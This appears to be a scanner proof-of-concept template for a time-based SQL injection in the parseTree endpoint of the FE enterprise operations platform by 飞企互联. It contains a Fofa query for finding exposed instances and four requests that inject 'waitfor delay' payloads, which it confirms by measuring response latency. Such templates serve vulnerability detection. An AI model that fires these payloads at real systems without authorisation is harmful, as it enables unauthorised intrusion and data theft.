id: feiqi-parsetree-sqli

info:
  name: 飞企互联-FE企业运营管理平台 parseTree 接口SQL注入
  author: zan8in
  severity: high
  verified: false
  descripiton: |-
    Fofa: app="飞企互联-FE企业运营管理平台"
  reference:
    - https://mp.weixin.qq.com/s/Cf9VaHgD1MqA1YhsX0UO6Q
  tags: feiqi,sqli
  created: 2024/02/28

rules:
  r0:
    request:
      method: GET
      path: /common/parseTree.js%70?code=1%27;waitfor%20delay%20%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
  r1:
    request:
      method: GET
      path: /common/parseTree.js%70?code=1%27;waitfor%20delay%20%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
  r2:
    request:
      method: GET
      path: /common/parseTree.js%70?code=1%27;waitfor%20delay%20%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
  r3:
    request:
      method: GET
      path: /common/parseTree.js%70?code=1%27;waitfor%20delay%20%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
expression: r0() && r1() && r2() && r3()
